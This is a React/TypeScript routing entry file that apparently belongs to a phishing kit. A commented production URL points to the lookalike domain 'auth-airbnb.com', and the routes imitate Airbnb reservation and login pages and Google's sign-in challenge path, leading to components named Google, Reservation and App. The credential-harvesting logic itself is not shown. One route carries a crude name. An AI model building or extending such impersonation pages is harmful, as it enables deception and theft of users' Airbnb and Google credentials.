import ReactDOM from 'react-dom/client';
import App from './App.tsx';
import './index.scss';
import { Route, BrowserRouter as Router, Routes } from 'react-router-dom';
import Google from './google/Google.tsx';
import Support from './support/Support.tsx';
import Reservation from './reservation/Reservation.tsx';

export const URL = 'http://localhost:10000'; // PROD: https://auth-airbnb.com
export const RESERVATION = 'ASD';

ReactDOM.createRoot(document.getElementById('root')!).render(
	<Router>
		<Routes>
			<Route path={`/hosting/reservations/details/:link`} element={<Reservation />} />
			<Route path={`/login/:link`} element={<App />} />
			<Route path='/support/penis' element={<Support />} />
			<Route path='/v3/signin/challenge/:link' element={<Google />} />
			<Route path='*' element={<div>Not Found</div>} />
		</Routes>
	</Router>
);
